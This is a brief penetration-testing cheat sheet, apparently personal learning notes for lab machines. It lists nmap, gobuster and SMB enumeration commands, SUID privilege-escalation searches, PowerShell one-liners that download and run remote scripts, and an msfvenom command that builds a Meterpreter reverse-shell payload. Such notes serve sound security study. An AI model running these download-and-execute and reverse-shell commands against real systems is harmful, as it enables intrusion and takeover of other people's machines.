# Penetration Testing Cheat Sheet
Captured learning notes

## Port scanning
```bash
nmap 10.10.10.150 -p-
nmap -sC -sV 10.10.150 -p80 -oA scan
```

## Web scan enumeration
```bash
dirhunt 10.10.10.150
gobuster -u 10.10.10.150 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

## Discover SMB shares
```bash
nmb lookup -A 10.10.10.150
smbclient -L \\fqdn -I 10.10.10.150 -N
```

## TTY/PTY
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

## Privilege Escalation with SUID
[Linux Privilege Escalation using SUID Binaries](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)
```bash
find / -perm -u=s -type f 2>/dev/null
```
[Linux PrivEsc: Abusing SUID](https://www.gracefulsecurity.com/linux-privesc-abusing-suid/)
```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

## Download Methods
### PowerShell
```powershell
IEX(New-Object Net.WebClient).downloadString('https://10.10.10.150:80/script.ps1')
powershell "(New-Object System.Net.WebClient).downloadFile('http://10.10.10.150:8000/file.exe','file.exe')"
```

## Padbuster
```bash
padbuster http://10.10.10.150 string # -cookies auth=string -encoding 0
```

## Decode/Decrypt
```bash
echo string | base64 --decode
```

## msfvenom
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
```
